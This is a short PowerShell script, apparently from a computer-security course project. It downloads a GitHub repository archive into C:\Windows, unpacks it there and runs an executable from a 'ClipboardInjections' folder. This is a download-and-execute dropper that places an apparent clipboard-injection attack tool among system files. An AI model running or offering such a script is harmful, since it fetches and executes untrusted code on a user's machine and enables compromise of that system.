wget https://api.github.com/repos/Flaque/comp-security-project/zipball/master -OutFile "C:\\Windows\comp-security-project-master.zip"

cd "C:\Windows\"
$shell = New-Object -ComObject shell.application
$zip = $shell.NameSpace("C:\Windows\comp-security-project-master.zip")
foreach ($item in $zip.items()) {
  $shell.Namespace("C:\Windows\").CopyHere($item)
}

cd "C:\\Windows\Flaque-comp-security-project-04b9203\ClipboardInjections\dist" ; .\Download.exe


